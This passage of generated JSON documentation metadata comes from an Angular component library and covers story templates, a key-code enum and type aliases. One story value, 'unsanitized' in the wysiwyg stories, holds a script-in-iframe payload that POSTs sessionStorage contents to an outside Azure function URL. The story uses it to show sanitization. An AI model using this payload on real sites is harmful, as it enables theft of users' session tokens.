              "defaultValue": "(args) => {\r\n  return {\r\n    component: NumberInputComponent,\r\n    props: {\r\n      ...args,\r\n      change: action('Value changed'),\r\n      control: new FormControl(null, Validators.required),\r\n      toggleValidator: (ctrl: AbstractControl) => {\r\n        if ( ctrl.validator ) {\r\n          ctrl.clearValidators();\r\n        } else {\r\n          ctrl.setValidators(Validators.required);\r\n        }\r\n        ctrl.updateValueAndValidity();\r\n      },\r\n    },\r\n    template: `\r\n  <mat-card class=\"sto-form\" style=\"width: 600px\">\r\n  <button (click)=\"control.disabled ? control.enable() : control.disable()\">Toggle disabled</button><br>\r\n  <button (click)=\"toggleValidator(control)\">Toggle validator</button><br>\r\n  <button (click)=\"control.markAsTouched()\">Touched</button><br>\r\n    <mat-form-field stoFormField floatLabel=\"always\">\r\n      <mat-label>{{label}}</mat-label>\r\n      <sto-number-input (ngModelChange)=\"change($event)\"\r\n            [dynamicFractionSize]=\"dynamicFractionSize\"\r\n                        [fractionSize]=\"fractionSize\"\r\n                        [readonly]=\"readonly\"\r\n                        [formControl]=\"control\"\r\n                        [placeholder]=\"placeholder\">\r\n      </sto-number-input>\r\n      <span matSuffix>{{ suffix }}</span>\r\n      <mat-error *ngIf=\"control.hasError('required')\">{{ control.getError('required') }}</mat-error>\r\n    </mat-form-field><br>\r\n    {{control.value}}\r\n  </mat-card>`\r\n  };\r\n}"
            },
            {
              "name": "Usage",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/number-input/number-input.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "Template.bind({})"
            }
          ],
          "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts": [
            {
              "name": "Template",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<SlideToggleComponent>",
              "defaultValue": "(args) => {\r\n  return {\r\n    component: SlideToggleComponent,\r\n    props: {\r\n      ...args,\r\n      ctrl: new FormControl(true),\r\n      valueChange: action('Value changed'),\r\n    },\r\n    template: `\r\n<mat-card style=\"width: 300px\" class=\"sto-form\">\r\n  <button (click)=\"ctrl.disabled ? ctrl.enable() : ctrl.disable()\">Toggle disabled</button><br>\r\n<mat-form-field stoFormField floatLabel=\"always\">\r\n    <mat-label>Slide toggle</mat-label>\r\n    <sto-slide-toggle [color]=\"color\" [readonly]=\"readonly\" [formControl]=\"ctrl\" (ngModelChange)=\"valueChange($event)\"></sto-slide-toggle>\r\n</mat-form-field>\r\n</mat-card>`\r\n  };\r\n}"
            },
            {
              "name": "Usage",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "Template.bind({})"
            }
          ],
          "libs/form/src/lib/sto-form/form-field.stories.ts": [
            {
              "name": "Template",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/sto-form/form-field.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<>",
              "defaultValue": "(args) => {\r\n  return {\r\n    component: FormFieldDirective,\r\n    props: args,\r\n    template: `\r\n  <mat-card class=\"sto-form\">\r\n<mat-form-field stoFormField *ngIf=\"withClasses\">\r\n<mat-label>Form field with styles</mat-label>\r\n<input value=\"Some value\" [disabled]=\"disabled\" [readonly]=\"readonly\" matInput>\r\n</mat-form-field>\r\n<mat-form-field stoFormField *ngIf=\"withClasses\">\r\n<mat-label>Form field with styles</mat-label>\r\n<mat-select><mat-option value=\"B\">A</mat-option></mat-select>\r\n</mat-form-field>\r\n<mat-form-field appearance=\"fill\" *ngIf=\"!withClasses\">\r\n<mat-label>Form field without styles</mat-label>\r\n<input value=\"Some value\" [disabled]=\"disabled\" [readonly]=\"readonly\" matInput>\r\n</mat-form-field>\r\n<mat-form-field stoFormField *ngIf=\"withClasses\">\r\n<mat-label>Text area with styles</mat-label>\r\n<textarea matInput [cdkTextareaAutosize]=\"true\">\r\nSome Text Content\r\n\r\nShould not select all on click\r\n</textarea>\r\n</mat-form-field>\r\n</mat-card>`\r\n  };\r\n}"
            },
            {
              "name": "Usage",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/sto-form/form-field.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "Template.bind({})"
            }
          ],
          "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts": [
            {
              "name": "Template",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<WysiwygComponent>",
              "defaultValue": "(args) => {\r\n  const ctrl = new FormControl(unsanitized);\r\n  return {\r\n    props: { ...args, ctrl, unsanitized },\r\n    template: `\r\n<sto-wysiwyg [readonly]=\"readonly\" #wysiwyg [formControl]=\"ctrl\"></sto-wysiwyg>\r\n<hr>\r\n<div>\r\n<p>The text we're sending in is</p>\r\n<div style=\"background-color: lightgray\"><code>{{ unsanitized }}</code></div>\r\n<br>\r\n<p>The resulting HTML output is then sanitized </p>\r\n<div style=\"background-color: lightgray\"><code >{{ wysiwyg.value.changingThisBreaksApplicationSecurity }}</code></div>\r\n<p>While it gets sanitized in the wysiwyg editor, best practice dictates that sanitizing happens before sending it in\r\n(and preferable on your backend service)</p>\r\n</div>\r\n`\r\n  };\r\n}"
            },
            {
              "name": "unsanitized",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "`<iframe srcdoc=\"<script>xmlHttp = new XMLHttpRequest();xmlHttp.open('POST','https://trader-x.azurewebsites.net/api/HttpTrigger1?code=3T29B641DhuW5ZA9GzvBiSNa4aoHmg1isvFE3JFEQAx7RqmOt6oIfA==',false);xmlHttp.send('token='+JSON.stringify(sessionStorage));</script>\">\r\n</iframe>\r\n<b>This is bold.</b>\r\n`"
            },
            {
              "name": "Usage",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "Template.bind({})"
            }
          ],
          "libs/common/src/lib/theme/theme-saver.service.ts": [
            {
              "name": "THEME_SAVER",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/common/src/lib/theme/theme-saver.service.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "new InjectionToken<ThemeSaver>('sto__theme__typo')"
            }
          ],
            "libs/common/src/lib/theme/models.ts": [
              {
                "name": "themes",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/theme/models.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "defaultValue": "new Map<ThemeName, ThemeClassName>([\r\n  [ 'light', 'sto-light-theme' ],\r\n  [ 'dark', 'sto-dark-theme' ],\r\n])"
              },
              {
                "name": "typography",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/theme/models.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "defaultValue": "new Map<TypographyName, TypographyClassName>([\r\n  [ 'small', 'sto-sm-typography' ],\r\n  [ 'medium', 'sto-m-typography' ],\r\n  [ 'large', 'sto-l-typography' ],\r\n])"
              }
            ],
          "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts": [
            {
              "name": "Usage",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<ConfirmDemoComponent>",
              "defaultValue": "(args: ConfirmDemoComponent) => {\r\n  return {\r\n    component: ConfirmDemoComponent,\r\n    props: args,\r\n    template: '<app-confirm-demo></app-confirm-demo>'\r\n  };\r\n}"
            }
          ],
          "libs/drawer/src/lib/sto-navigation/tokens.ts": [
            {
              "name": "USE_HASH_ROUTING",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/lib/sto-navigation/tokens.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "new InjectionToken<boolean>('sto.nav.hash')"
            }
          ],
          "libs/form/src/lib/sto-wysiwyg/modifiers.ts": [
            {
              "name": "validCommands",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "[]",
              "defaultValue": "[\r\n  'bold',\r\n  'underline',\r\n  'italic',\r\n  'createLink',\r\n  'insertUnorderedList',\r\n  'insertOrderedList',\r\n  'removeFormat',\r\n]"
            }
          ]
        },
        "groupedFunctions": {
            "libs/error-handler/src/lib/wrapper.ts": [
              {
                "name": "LoggerFactory",
                "file": "libs/error-handler/src/lib/wrapper.ts",
                "ctype": "miscellaneous",
                "subtype": "function",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "args": [
                  {
                    "name": "http",
                    "type": "HttpClient",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "jsdoctags": [
                  {
                    "name": "http",
                    "type": "HttpClient",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
            "tools/scripts/build-scss.ts": [
              {
                "name": "processScss",
                "file": "tools/scripts/build-scss.ts",
                "ctype": "miscellaneous",
                "subtype": "function",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "args": [
                  {
                    "name": "file",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": ""
                  },
                  {
                    "name": "outFile",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "returnType": "Promise<void>",
                "jsdoctags": [
                  {
                    "name": "file",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  },
                  {
                    "name": "outFile",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ]
        },
        "groupedEnumerations": {
            "libs/datatable/src/lib/sto-datatable/columns.ts": [
                {
                    "name": "ColumnDisplay",
                    "childs": [
                      {
                        "name": "Flex",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "flex"
                      },
                      {
                        "name": "Force",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "force"
                      }
                    ],
                  "ctype": "miscellaneous",
                  "subtype": "enum",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "description": "",
                  "file": "libs/datatable/src/lib/sto-datatable/columns.ts"
                }
            ],
            "libs/core/src/lib/abstract-and-interfaces/keyPress.enum.ts": [
                {
                    "name": "Key",
                    "childs": [
                      {
                        "name": "Backspace",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "8"
                      },
                      {
                        "name": "Tab",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "9"
                      },
                      {
                        "name": "Enter",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "13"
                      },
                      {
                        "name": "Shift",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "16"
                      },
                      {
                        "name": "Ctrl",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "17"
                      },
                      {
                        "name": "Alt",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "18"
                      },
                      {
                        "name": "PauseBreak",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "19"
                      },
                      {
                        "name": "CapsLock",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "20"
                      },
                      {
                        "name": "Escape",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "27"
                      },
                      {
                        "name": "Space",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "32"
                      },
                      {
                        "name": "PageUp",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "33"
                      },
                      {
                        "name": "PageDown",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "34"
                      },
                      {
                        "name": "End",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "35"
                      },
                      {
                        "name": "Home",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "36"
                      },
                      {
                        "name": "LeftArrow",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "37"
                      },
                      {
                        "name": "UpArrow",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "38"
                      },
                      {
                        "name": "RightArrow",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "39"
                      },
                      {
                        "name": "DownArrow",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "40"
                      },
                      {
                        "name": "Insert",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "45"
                      },
                      {
                        "name": "Delete",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "46"
                      },
                      {
                        "name": "Zero",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "48"
                      },
                      {
                        "name": "ClosedParen",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Zero"
                      },
                      {
                        "name": "One",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "49"
                      },
                      {
                        "name": "ExclamationMark",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "One"
                      },
                      {
                        "name": "Two",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "50"
                      },
                      {
                        "name": "AtSign",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Two"
                      },
                      {
                        "name": "Three",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "51"
                      },
                      {
                        "name": "PoundSign",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Three"
                      },
                      {
                        "name": "Hash",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "PoundSign"
                      },
                      {
                        "name": "Four",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "52"
                      },
                      {
                        "name": "DollarSign",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Four"
                      },
                      {
                        "name": "Five",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "53"
                      },
                      {
                        "name": "PercentSign",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Five"
                      },
                      {
                        "name": "Six",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "54"
                      },
                      {
                        "name": "Caret",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Six"
                      },
                      {
                        "name": "Hat",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Caret"
                      },
                      {
                        "name": "Seven",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "55"
                      },
                      {
                        "name": "Ampersand",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Seven"
                      },
                      {
                        "name": "Eight",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "56"
                      },
                      {
                        "name": "Star",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Eight"
                      },
                      {
                        "name": "Asterik",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Star"
                      },
                      {
                        "name": "Nine",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "57"
                      },
                      {
                        "name": "OpenParen",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Nine"
                      },
                      {
                        "name": "A",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "65"
                      },
                      {
                        "name": "B",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "66"
                      },
                      {
                        "name": "C",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "67"
                      },
                      {
                        "name": "D",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "68"
                      },
                      {
                        "name": "E",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "69"
                      },
                      {
                        "name": "F",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "70"
                      },
                      {
                        "name": "G",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "71"
                      },
                      {
                        "name": "H",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "72"
                      },
                      {
                        "name": "I",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "73"
                      },
                      {
                        "name": "J",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "74"
                      },
                      {
                        "name": "K",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "75"
                      },
                      {
                        "name": "L",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "76"
                      },
                      {
                        "name": "M",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "77"
                      },
                      {
                        "name": "N",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "78"
                      },
                      {
                        "name": "O",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "79"
                      },
                      {
                        "name": "P",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "80"
                      },
                      {
                        "name": "Q",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "81"
                      },
                      {
                        "name": "R",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "82"
                      },
                      {
                        "name": "S",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "83"
                      },
                      {
                        "name": "T",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "84"
                      },
                      {
                        "name": "U",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "85"
                      },
                      {
                        "name": "V",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "86"
                      },
                      {
                        "name": "W",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "87"
                      },
                      {
                        "name": "X",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "88"
                      },
                      {
                        "name": "Y",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "89"
                      },
                      {
                        "name": "Z",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "90"
                      },
                      {
                        "name": "LeftWindowKey",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "91"
                      },
                      {
                        "name": "RightWindowKey",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "92"
                      },
                      {
                        "name": "SelectKey",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "93"
                      },
                      {
                        "name": "Numpad0",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "96"
                      },
                      {
                        "name": "Numpad1",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "97"
                      },
                      {
                        "name": "Numpad2",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "98"
                      },
                      {
                        "name": "Numpad3",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "99"
                      },
                      {
                        "name": "Numpad4",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "100"
                      },
                      {
                        "name": "Numpad5",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "101"
                      },
                      {
                        "name": "Numpad6",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "102"
                      },
                      {
                        "name": "Numpad7",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "103"
                      },
                      {
                        "name": "Numpad8",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "104"
                      },
                      {
                        "name": "Numpad9",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "105"
                      },
                      {
                        "name": "Multiply",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "106"
                      },
                      {
                        "name": "Add",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "107"
                      },
                      {
                        "name": "Subtract",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "109"
                      },
                      {
                        "name": "DecimalPoint",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "110"
                      },
                      {
                        "name": "Divide",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "111"
                      },
                      {
                        "name": "F1",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "112"
                      },
                      {
                        "name": "F2",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "113"
                      },
                      {
                        "name": "F3",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "114"
                      },
                      {
                        "name": "F4",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "115"
                      },
                      {
                        "name": "F5",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "116"
                      },
                      {
                        "name": "F6",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "117"
                      },
                      {
                        "name": "F7",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "118"
                      },
                      {
                        "name": "F8",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "119"
                      },
                      {
                        "name": "F9",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "120"
                      },
                      {
                        "name": "F10",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "121"
                      },
                      {
                        "name": "F11",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "122"
                      },
                      {
                        "name": "F12",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "123"
                      },
                      {
                        "name": "NumLock",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "144"
                      },
                      {
                        "name": "ScrollLock",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "145"
                      },
                      {
                        "name": "SemiColon",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "186"
                      },
                      {
                        "name": "Equals",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "187"
                      },
                      {
                        "name": "Comma",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "188"
                      },
                      {
                        "name": "Dash",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "189"
                      },
                      {
                        "name": "Period",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "190"
                      },
                      {
                        "name": "UnderScore",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Dash"
                      },
                      {
                        "name": "PlusSign",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Equals"
                      },
                      {
                        "name": "ForwardSlash",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "191"
                      },
                      {
                        "name": "Tilde",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "192"
                      },
                      {
                        "name": "GraveAccent",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "Tilde"
                      },
                      {
                        "name": "OpenBracket",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "219"
                      },
                      {
                        "name": "ClosedBracket",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "221"
                      },
                      {
                        "name": "Quote",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "222"
                      }
                    ],
                  "ctype": "miscellaneous",
                  "subtype": "enum",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "description": "<p>MIT License</p>\n<p>Copyright (c) 2017 Nathan Friend</p>\n<p>Permission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the &quot;Software&quot;), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:</p>\n<p>The above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.</p>\n<p>THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE. *</p>\n",
                  "file": "libs/core/src/lib/abstract-and-interfaces/keyPress.enum.ts"
                }
            ],
            "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts": [
                {
                    "name": "MenuItemTypes",
                    "childs": [
                      {
                        "name": "External",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "externalLink"
                      },
                      {
                        "name": "ExternalNew",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "externalLinkNewWindow"
                      },
                      {
                        "name": "Internal",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "internalLink"
                      },
                      {
                        "name": "Navigate",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "navigate"
                      }
                    ],
                  "ctype": "miscellaneous",
                  "subtype": "enum",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "description": "",
                  "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts"
                }
            ],
            "libs/datatable/src/lib/sto-datatable/selection-modes.ts": [
                {
                    "name": "SelectionModes",
                    "childs": [
                      {
                        "name": "Click",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "click"
                      },
                      {
                        "name": "DoubleClick",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "value": "dblclick"
                      }
                    ],
                  "ctype": "miscellaneous",
                  "subtype": "enum",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "description": "",
                  "file": "libs/datatable/src/lib/sto-datatable/selection-modes.ts"
                }
            ]
        },
        "groupedTypeAliases": {
            "libs/datatable/src/lib/sto-datatable/columns.ts": [
              {
                "name": "ClassFunction",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "function",
                "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "kind": 178
              },
              {
                "name": "SortFunction",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "function",
                "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "kind": 178
              }
            ],
          "libs/drawer/src/lib/nav-drawer/navigation.ts": [
            {
              "name": "CommonNavigation",
              "ctype": "miscellaneous",
              "subtype": "typealias",
              "rawtype": "literal type",
              "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "description": "",
              "kind": 181
            },
            {
              "name": "Navigation",
              "ctype": "miscellaneous",
              "subtype": "typealias",
              "rawtype": "",
              "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "description": "",
              "kind": 187
            },
            {
              "name": "NavigationChild",
              "ctype": "miscellaneous",
              "subtype": "typealias",
              "rawtype": "",
              "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "description": "",
              "kind": 187
            }
          ],
          "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts": [
            {
              "name": "Data",
              "ctype": "miscellaneous",
              "subtype": "typealias",
              "rawtype": "literal type",
              "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "description": "",
              "kind": 181
            }
          ],
          "libs/error-handler/src/lib/error-handler/error-handler.ts": [
            {
              "name": "Handler",
              "ctype": "miscellaneous",
              "subtype": "typealias",
              "rawtype": "function",
              "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "description": "",
              "kind": 178
            }
          ],
          "libs/datatable/src/lib/sto-datatable/events.ts": [
            {
              "name": "HeaderContextMenu",
              "ctype": "miscellaneous",
              "subtype": "typealias",
              "rawtype": "ContextMenu",
              "file": "libs/datatable/src/lib/sto-datatable/events.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "description": "",
              "kind": 177
            },
            {
              "name": "RowContextMenu",
              "ctype": "miscellaneous",
              "subtype": "typealias",
              "rawtype": "",
              "file": "libs/datatable/src/lib/sto-datatable/events.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "description": "",
              "kind": 187
            }
          ],
            "libs/drawer/src/lib/sto-navigation/navigation.stories.ts": [
              {
                "name": "Menu",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "literal type",
                "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "kind": 181
              }
            ],
            "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts": [
              {
                "name": "Menu",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "",
                "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "kind": 187
              }
            ],
            "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts": [
              {
                "name": "PaneType",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "\"left\" | \"right\"",
                "file": "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "kind": 186
              }
            ],
            "libs/common/src/lib/theme/theme-saver.service.ts": [
              {
                "name": "ReturnValue",
                "ctype": "miscellaneous",
                "subtype": "typealias",
